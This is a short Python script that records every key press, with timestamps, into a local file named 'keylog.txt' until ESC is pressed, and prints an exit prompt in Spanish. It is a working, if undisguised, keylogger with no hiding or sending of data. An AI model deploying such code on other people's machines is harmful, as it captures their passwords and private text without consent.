import keyboard
from datetime import datetime

LOG_FILE = "keylog.txt"

def write_to_log(event):
    if event.event_type == keyboard.KEY_DOWN:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            f.write(f"[{timestamp}] {event.name}\n")

print("Presiona ESC para salir.")

keyboard.hook(write_to_log)
keyboard.wait("esc")
